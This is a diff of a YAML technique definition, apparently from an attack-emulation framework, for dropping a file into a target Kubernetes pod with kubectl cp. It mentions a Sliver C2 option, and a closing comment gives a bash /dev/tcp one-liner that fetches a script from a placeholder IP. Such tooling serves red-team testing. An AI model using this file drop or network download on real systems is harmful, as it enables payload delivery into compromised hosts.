@@ -11,8 +11,9 @@ parameters:
     type: string
     description: Path on the target system where the file will be transfered
   POD_NAME:
-    type: string
+    type: Pod
     description: Name of the target pod
+    default: ${TARGET} 
   NAMESPACE:
     type: Namespace
     description: Kubernetes namespace of the target pod
@@ -26,14 +27,12 @@ procedures:
   - key: kubectl
     command: kubectl cp -n ${NAMESPACE} ${SRC_PATH} ${POD_NAME}:${DST_PATH}
     isLocal: true
-    precondition:
-      - "target.hasBinary(tar)"
   # - key: sliver
   #   command: get_file ${SRC_PATH}
 preconditions:
   accessLevel: user-write
   kind: Pod
 effects:
-  - "target.hasFile"
+  - "target.has-binary(${DST_PATH})"
 #  try this onliner to download a file
 # bash -c "exec 3<>/dev/tcp/IP/80; echo -e 'GET /youfile.sh HTTP/1.1\r\nHost: ip\r\nConnection: close\r\n\r\n' >&3; cat <&3 > yourfile.sh"
